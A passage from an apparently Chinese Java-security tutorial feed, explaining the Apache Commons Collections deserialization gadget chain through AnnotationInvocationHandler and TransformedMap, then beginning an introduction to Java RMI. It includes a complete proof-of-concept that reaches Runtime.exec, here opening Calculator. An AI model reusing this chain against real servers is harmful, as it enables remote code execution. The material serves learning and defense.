data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-090625.png"                      alt="image-20230420170624983"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-090846.png"                      alt="image-20230420170846133"                ></p><p>​    通过几步跳转 , 可以确定这里 <strong>var3</strong> 是一个 <strong>HashMap</strong> , 因此上文 <strong>var3.get()</strong> 就是调用 <strong>HashMap.get()</strong> 方法.</p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>​    现在需要关注 <strong>this.memberValues</strong> 与 <strong>var2</strong> 的值了 . 其中 <strong>var2</strong> 的赋值如下 :</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-151426.png"                      alt="image-20230420231425787"                ></p><p>​    为了确定 <strong>this.type</strong> 和 <strong>this.memberValues</strong> 的值 , 我们来看一下当前类构造函数的定义 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-151818.png"                      alt="image-20230420231818011"                ></p><p>​    <strong>AnnotationInvocationHandler</strong> 的构造函数第二个参数类型为 Map , 这点非常巧 , 我们可以直接传入 <strong>TransformedMap</strong> 实例对象.</p><p>​    var1是一个注解类</p><p>​    <strong>注意 : 这里 var1 , var2 是构造函数的形式参数 , 并非 readObject() 方法中的 var1 和 var2！</strong></p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>​    <strong>再次注意，这里 var1 , var2 是 readObject() 方法中的形式参数.</strong></p><ol><li>构造函数 <strong>AnnotationInvocationHandler.AnnotationInvocationHandler()</strong></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-155400.png"                      alt="image-20230420235400614"                ></p><p>​    这里 <strong>this.type</strong> 被赋值为 <strong>java.lang.annotation.Retention</strong></p><ol start="2"><li><strong>var2 = AnnotationType.getInstance(this.type)</strong></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-160238.png"                      alt="image-20230421000237811"                ></p><p>​    经过这步赋值 , var2 实例对象中的 memberTypes 参数变为一个 HashMap , 其中存在键值对 : {“value” : “java.lang.annotation.RetentionPolicy”}</p><ol start="3"><li><strong>Class var7 = (Class)var3.get(var6)</strong></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-160524.png"                      alt="image-20230421000523246"                ></p><p>​    这里调用了 var3.get(var6) , 并将结果赋值给变量 var7 , var3 是一个 HashMap , var6 值为 “value” , 所以实际执行的是 HashMap.get(“value”) . 而 var3 中恰好存在名为 “value” 的键名 , 因此可以把 “value” 的值 “java.lang.annotation.RetentionPolicy” , 赋值给变量 var7.</p><p>​    这样变量 var7 就不为空了 , 自然通过了下文 if (var7 != null) 的条件判断 .</p><ol start="4"><li><strong>综上所述 , 由于变量 var6 的值为 value , 因此变量 var7 可以获取到值并通过下面的条件判断 . 而 var6 的值又是通过 var5.getKey() 获取的 , 而 var5 就是我们代码中创建的 HashMap</strong></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-161917.png"                      alt="image-20230421001916896"                ></p><p>​    因此这里也引出了该 POC 利用成功的一个核心要求 : 手工创建的 HashMap 的键名必须为 Value .</p><p>​    相反 , 如果这里 HashMap 的键名被赋予其他值( 例如 “mes9s0” ) , 那么此处将执行 HashMap.get(“mes9s0”) , 哈希表中不存在这个键名 , 因此 var7 会被赋值 null , 不会通过下面的 if 条件判断 .</p><ol start="5"><li>后面就没啥好说的, 程序将执行到 <strong>var5.setValue()</strong> , 即执行 <strong>AbstractInputCheckedMapDecorator$MapEntry.setValue()</strong> 方法 , 进入恶意函数调用链 .</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-162200.png"                      alt="image-20230421002159675"                ></p><p>​    至此 , 当我们构造的恶意类在远程服务器通过 <strong>readObject()</strong> 方法进行反序列化时 , 会自动调用 <strong>AbstractInputCheckedMapDecorator$MapEntry.setValue()</strong> 方法 , 进入我们构造好的恶意函数调用链 , 最终执行任意代码 .</p><h2 id="反序列化命令执行POC"><a href="#反序列化命令执行POC" class="headerlink" title="反序列化命令执行POC"></a>反序列化命令执行POC</h2><p>​    现在可以构造完整的 POC 了 . 我们仅需要获取 <strong>AnnotationInvocationHandler</strong> 实例对象 , 并向构造函数中传入Retention类 与 TransformedMap实例对象 , 即可实现POP攻击链自动调用 .</p><p>​    需要注意的是 , <strong>AnnotationInvocationHandler</strong>类的构造函数使用了默认修饰符 , 通过默认修饰符修饰的方法只能同包访问 , 因此这里无法直接访问 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-162411.png"                      alt="image-20230421002410602"                ></p><p>​    这里与获取 <strong>java.lang.Runtime</strong> 实例对象的思路类似 , 即通过反射来获取类 , 通过 **getDeclaredConstructor()**方法获取构造器 , 通过 <strong>setAccessible()</strong> 方法来开放构造器访问权限.</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-162441.png"                      alt="image-20230421002440460"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">highPoc_transform</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//此处Tranformer数组里面的值是三个对象，是因为ChainedTransformer里可以循环调用，并把上一层传给下一层</span></span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//pass</span></span><br><span class="line">                <span class="comment">/*反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，</span></span><br><span class="line"><span class="comment">                返回Runtime.getRuntime方法</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，</span></span><br><span class="line"><span class="comment">                返回Runtime实例化对象</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        org.apache.commons.collections.<span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        transformerChain.transform(&quot;mes9s0&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        //此处往下为本地POC，无法远程反序列化</span></span><br><span class="line"><span class="comment">        //创建Map并绑定transformerChain</span></span><br><span class="line"><span class="comment">        Map innerMap = new HashMap();</span></span><br><span class="line"><span class="comment">        //初始化HashMap</span></span><br><span class="line"><span class="comment">        innerMap.put(null,null);</span></span><br><span class="line"><span class="comment">        //调用decorate()方法</span></span><br><span class="line"><span class="comment">        Map outerMap = TransformedMap.decorate(innerMap,null,transformerChain);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        //触发漏洞</span></span><br><span class="line"><span class="comment">        //获取AbstractInputCheckedMapDecorator$MapEntry</span></span><br><span class="line"><span class="comment">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span></span><br><span class="line"><span class="comment">        onlyElement.setValue(&quot;mes9s0&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ins</span> <span class="operator">=</span> cons.newInstance(java.lang.annotation.Retention.class,transformedmap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(exp);</span><br><span class="line">        oos.writeObject(ins);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(out);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-162558.png"                      alt="image-20230421002557913"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;写在之前&quot;&gt;&lt;a href=&quot;#写在之前&quot; class=&quot;headerlink&quot; title=&quot;写在之前&quot;&gt;&lt;/a&gt;写在之前&lt;/h2&gt;&lt;p&gt;​    其实对于基础，真的太多太多了，需要学习的也很多，如果真的可以坚持全部做下来，其实对Java语言基础理解应该是足够的</summary>
      
    
    
    
    <category term="Java安全基础篇" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    
    
    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="CC" scheme="http://example.com/tags/CC/"/>
    
    <category term="POP Gadget Chains" scheme="http://example.com/tags/POP-Gadget-Chains/"/>
    
  </entry>
  
  <entry>
    <title>Java安全从零到一(7)-Java RMI相关</title>
    <link href="http://example.com/2023/01/30/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-7-Java-RMI%E7%9B%B8%E5%85%B3/"/>
    <id>http://example.com/2023/01/30/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-7-Java-RMI%E7%9B%B8%E5%85%B3/</id>
    <published>2023-01-30T03:07:04.000Z</published>
    <updated>2023-04-22T08:03:00.436Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java-RMI"><a href="#Java-RMI" class="headerlink" title="Java RMI"></a>Java RMI</h2><p>​    一部分记录 Java RMI 的原理/流程 , 一部分记录 Java RMI 的利用手段/攻击技巧</p><h2 id="什么是Java-RMI"><a href="#什么是Java-RMI" class="headerlink" title="什么是Java RMI"></a>什么是Java RMI</h2><p>​    <strong>RMI ( Remote Method Invocation , 远程方法调用 ) 能够让在某个 Java虚拟机上的对象像调用本地对象一样调用另一个 Java虚拟机 中的对象上的方法 , 这两个 Java虚拟机 可以是运行在同一台计算机上的不同进程, 也可以是运行在网络中不同的计算机上 .</strong></p><h2 id="为什么有Java-RMI"><a href="#为什么有Java-RMI" class="headerlink" title="为什么有Java RMI"></a>为什么有Java RMI</h2><p>​    先思考下面这几个问题 :</p><h3 id="1-假设服务端上存在很多对象及方法："><a href="#1-假设服务端上存在很多对象及方法：" class="headerlink" title="1. 假设服务端上存在很多对象及方法："></a>1. <strong>假设服务端上存在很多对象及方法：</strong></h3><p>​        客户端上有程序想要调用服务端上某个对象的方法 . 于是客户端会发出请求 . 但是**服务端不可能将自己所有的对象与方法都发送给客户端 , 也不可能让客户端任意调用自己每一个对象与方法 . 一旦这样做 , 服务端的安全性将会受到极大的挑战 **</p><h3 id="2-假设服务端确定了远程调用的资源"><a href="#2-假设服务端确定了远程调用的资源" class="headerlink" title="2. 假设服务端确定了远程调用的资源:"></a>2. <strong>假设服务端确定了远程调用的资源</strong>:</h3><p>​        客户端开始访问需要的对象与方法 , 我们都知道 Java 调用本地对象方法的过程是下面这样的 .</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectClassA</span> <span class="variable">objectA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectClassA</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> objectA.MethodA();</span><br></pre></td></tr></table></figure><p>​        此时我们知道类名是 ObjectClassA , 实例对象是 objectA , objectA 存在方法 MethodA() .</p><p>​        但是在远程调用的过程中 , 如果 <strong>ObjectA</strong> 在 <strong>JVMA</strong> 上 , 我们执行的程序在 <strong>JVMB</strong> 上 . 那对于我们的程序来说 , 是不知道 <strong>JVMA</strong> 上创建的实例对象叫什么的 . 即使知道了实例对象叫什么 , 那么下次程序一修改 , 实例对象的名称很有可能会变化 , 这样我们的程序又无法远程访问了 .</p><p>​        <strong>此时问题就产生了 , 实例对象的名称是可以随意改变的 , 但是在远程调用时 , 我们更希望目标的名称是固定的 , 这样我们就能在不修改任何代码的情况下调用远程对象了 .</strong></p><h3 id="3-假设客户端找到了想要的资源"><a href="#3-假设客户端找到了想要的资源" class="headerlink" title="3. 假设客户端找到了想要的资源:"></a>3. <strong>假设客户端找到了想要的资源</strong>:</h3><p>​        此时客户端准备调用目标对象, 并将结果返回 .</p><p>​        现在存在一个问题 : 连接两端必须要确保数据在发送和返回的途中不会遭到破坏 .</p><p>​        我们要知道 : <strong>客户端访问的资源不是预定义的基本数据类型 , 而是完整的对象</strong> . 如果先将对象分解成基本数据类型 , 再传输这些基本数据类型的数据 , 最后再将这些基本数据类型拼接成对象 . <strong>即使转换过程中没有数据丢失 , 代码的复杂度也是一个很大的挑战</strong> .</p><h3 id="4-假设客户端找到了一个合适的传输方法"><a href="#4-假设客户端找到了一个合适的传输方法" class="headerlink" title="4. 假设客户端找到了一个合适的传输方法"></a>4. <strong>假设客户端找到了一个合适的传输方法</strong></h3><p>​        程序终于要开始进行远程调用了, 然而问题还没完 . 在大型项目中 , 程序可能需要频繁的进行远程调用 , 开发人员不可能为每次调用设计一套专门的调用方法 , 这样不仅耗时耗力 , 还很容易出错 .</p><p>​        开发人员更希望有一个统一且规范的接口 , 能在添加尽可能少的代码的前提下 , 完成所有的远程调用 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-034918.png"                      alt="image-20230417114918071"                ></p><p>​    <strong>此时 JAVA RMI 出现了 , 通过它可以解决上述的所有问题 .</strong></p><h2 id="Java-RMI的流程"><a href="#Java-RMI的流程" class="headerlink" title="Java RMI的流程"></a>Java RMI的流程</h2><p>​    在上面给出了一张JavaRMI的流程图，我们看看具体是如何解决的</p><p>​    如果让客户端直接访问服务端的资源 , 那么有可能出现越权访问的风险 . <strong>在 JAVA RMI 中 , 通过一个 中间人 来解决这类问题 .</strong></p><p>​    <strong>服务端( RMIServer ) 会将自己提供的服务的实现类交给这个中间人 , 并公开一个名称 . 任何客户端( RMIClient )都可以通过公开的名称找到这个实现类 , 并调用它 .</strong></p><p>​    这样以来 , 不仅避免了客户端和服务端资源的直接交互 . 也使得客户端能更好的查找要使用的对象( 直接去询问这个中间人 , 若中间人拥有对应实现类 , 那么客户端可以在本地直接调用该类的方法 . 若中间人没有对应的实现类 , 则说明服务端没有提供相应服务 )</p><p>​    这个中间人也被称为 <strong>RMIService / RMIRegister</strong> .</p><p>​    因此整个 RMI 的流程实际上分为三个部分 , <strong>RMIServer</strong> , <strong>RMIClient</strong> , <strong>RMIRegister</strong> . 其交互的流程如下所示 :</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-040750.png"                      alt="image-20230417120750041"                ></p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>下面尝试代码实现：</p><p> <strong>1.服务端定义一个远程接口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    既然 RMIServer 要提供服务 , 那么它一定会准备一个接口 , 让客户端通过这个接口来访问服务 .</p><p>​    在 Java 中 , 如果一个类继承了 java.rmi.Remote 接口 , 那么该类将成为一个服务端的远程对象 , 供客户端访问并提供一定的服务 .</p><p>​    Remote 接口是一个标识接口 , 本身不包含任何方法 , 该接口用于标识其子类的方法可以被非本地的Java虚拟机调用</p><p>​    由于远程调用的本质依旧是 “ 网络通信 “ . 而网络通信是经常出现异常的 . 因此 , 继承 Remote 接口的接口的所有方法必须要抛出 RemoteException 异常 . 事实上 , RemoteException 也是继承于 IOException 的 .</p><p><strong>2. 服务端调用远程接口的实现类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//远程接口的实现类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RuntimeException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    实现类必须要继承 <strong>UnicastRemoteObject</strong> 类 </p><p>​    <strong>只有当接口的实现类继承了 UnicastRemoteObject 类 , 客户端访问获得远程对象时 , 远程对象才将会把自身的一个拷贝以 Socket 的形式传输给客户端</strong>，这个拷贝也就是 Stub , 或者叫做 “ 存根 “ .</p><p>​    <strong>准确的说 , java.rmi.server.UnicastRemoteObject 类的构造函数将生成 Stub 和 Skeleton</strong> . 而继承该类的子类将会在实例化时自动执行父类的构造函数 , 从而也生成 Stub 和 Skeleton .</p><p>​    <strong>这个 Stub 可以看作是远程对象在本地的一个代理 , 其中包含了远程对象的具体信息 . 客户端可以通过这个代理与服务端进行交互 .</strong></p><p>​    <strong>Skeleton 也叫做 “ 骨架 “ , 可以看作是服务端的一个代理 , 用来处理 Stub 发来的请求 , 然后去调用客户端真正需求的方法 , 然后再将方法执行结果返回给 Stub .</strong></p><p>​    其实 , 与其说是客户端和服务端进行交互 , 不如说是 <strong>客户端代理( Stub ) 和 服务端代理( Skeleton ) 在进行交互</strong> .</p><p>​    <strong>但是为什么一直没有提到这个 Skeleton 呢 ? 因为在 JDK1.2 以后的 RMI 中 , 可以通过反射API 直接将请求发送给真实类 , 不再需要 Skeleton 来做中转了</strong></p><p>​    该实现类实现了远程接口中的 <strong>sayHello()</strong> 方法 .</p><p><strong>3. 开启 RMIRegister 并在上面注册远程对象 , 并向客户端提供对应的服务了 .</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务端注册</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Hello</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Naming.rebind(<span class="string">&quot;rmi://localhost:1099/hello&quot;</span>, h);</span><br><span class="line">            System.out.println(<span class="string">&quot;HelloServer 成功启动&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException | MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>Hello h = new HelloImpl();</strong> : 上文提到过, HelloImpl 对象在实例化时会自动调用其父类 UnicastRemoteObject 的构造方法 , 生成对应的 Stub 和 Skeleton . 由于 Skeleton 已经不再需要 , 所以这里仅会返回 Stub 的引用 .</p><p>​    上文也曾提到 : JAVA RMI 由三个部分组成 , 分别是 <strong>RMIClient</strong> , <strong>RMIServer</strong> , <strong>RMIService</strong> . 其中 <strong>RMIService</strong> 可以放在单独的 Java 虚拟机中启动 , 也可以通过 <strong>RMIServer</strong> 来启动 . 在正常的开发环境中 , 基本不会给 <strong>RMIService</strong> 一个单独的运行环境的 , 往往是通过 <strong>RMIServer</strong> 来启动的 .</p><p>​    <strong>LocateRegistry.createRegistry(1099);</strong> : 即在本地创建并启动 RMIService , 被创建的 RMIService 服务将会在指定的端口上监听请求 .</p><p>​    RMIService ( RMIRegister ) 服务的默认端口为 : 1099</p><p>​    java.rmi.Naming 类提供在对象注册表中存储和获得远程对远程对象引用的方法 . 这里将远程对象 “ h “ 绑定到 <strong>rmi://localhost:1099/hello</strong> 这个 URL 上 . 客户端可以通过这个 URL 直接访问远程对象 .</p><p>​    这里涉及到了另一个问题 : 即 “ 开发人员不知道远程实例对象的名称是什么 .” 而通过这种绑定机制 , 开发人员仅需要知道一个公开的路径(URL) , 就可以直接访问到对应的远程对象了 .</p><p>​    至此 , 服务端的配置已经结束了 , RMIServer 将提供的服务注册在了 RMIService 上 , 并且公开了一个固定的路径 , 供客户端访问 .</p><h3 id="客户端配置"><a href="#客户端配置" class="headerlink" 